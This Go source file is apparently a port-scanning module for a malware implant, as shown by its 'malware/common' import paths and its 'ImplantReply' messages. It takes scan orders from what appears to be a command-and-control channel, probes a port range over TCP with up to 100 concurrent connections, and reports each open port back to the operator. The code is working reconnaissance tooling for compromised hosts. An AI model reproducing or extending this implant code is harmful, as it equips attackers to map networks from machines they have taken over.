package portscan

import (
	"context"
	"fmt"
	"golang.org/x/sync/semaphore"
	"malware/common/messages"
	"malware/common/types"
	"net"
	"strings"
	"sync"
	"time"
)

type state struct {
	running  bool
	scanning bool
	lock     *semaphore.Weighted
}

type settings struct {
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false, scanning: false, lock: semaphore.NewWeighted(100)}
	return settings{&state}
}

func ScanPort(ip string, port int, timeout time.Duration) bool {
	target := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		if strings.Contains(err.Error(), "too many open files") {
			time.Sleep(timeout)
			return ScanPort(ip, port, timeout)
		}
		return false
	}

	conn.Close()
	return true
}

func (settings settings) portscan(portscan *messages.PortScan, callback func(*messages.ImplantReply)) {
	if portscan.Cancel {
		settings.state.scanning = false
	} else {
		if settings.state.scanning {
			callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte("Already running")})
		} else {
			wg := sync.WaitGroup{}

			settings.state.scanning = true
			for port := portscan.StartPort; port <= portscan.EndPort && settings.state.scanning; port++ {
				wg.Add(1)
				settings.state.lock.Acquire(context.TODO(), 1)

				go func(port int) {
					defer settings.state.lock.Release(1)
					defer wg.Done()
					if ScanPort(portscan.Ip, port, time.Second/4) {
						callback(&messages.ImplantReply{Module: settings.ID(), Portscan: &messages.PortScanReply{Status: messages.PortScanReply_IN_PROGRESS, Found: int32(port)}})
					}
				}(int(port))
			}

			wg.Wait()
			settings.state.scanning = false
			callback(&messages.ImplantReply{Module: settings.ID(), Portscan: &messages.PortScanReply{Status: messages.PortScanReply_COMPLETE}})
		}
	}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
	portscan := message.GetPortscan()
	if portscan == nil {
		return
	}

	go settings.portscan(portscan, callback)

}

// Init the state of this module
func (settings settings) Init() {
	settings.state.running = true
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "portscan" }
